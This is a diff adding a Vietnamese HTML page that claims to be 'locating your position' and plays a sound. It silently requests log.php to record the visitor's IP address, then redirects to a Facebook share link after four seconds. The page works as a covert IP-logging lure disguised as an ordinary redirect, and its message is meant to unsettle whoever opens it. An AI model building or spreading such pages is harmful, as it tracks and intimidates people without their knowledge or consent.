@@ -1,0 +1,50 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Đang chuyển hướng...</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    .popup {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+  </style>
+</head>
+<body onload="playSound(); redirect();">
+
+  <div class="popup">
+    <h2>🔍 Đang định vị vị trí của bạn...</h2>
+    <p>Vui lòng không tắt trang.</p>
+  </div>
+
+  <audio id="audio" src="sound.mp3" autoplay></audio>
+
+  <script>
+    function playSound() {
+      document.getElementById('audio').play();
+    }
+    function redirect() {
+      setTimeout(() => {
+        window.location.href = "https://www.facebook.com/share/1Dkxw85w2p/";
+      }, 4000);
+    }
+
+    // Gửi request log IP
+    fetch('log.php');
+  </script>
+</body>
+</html>
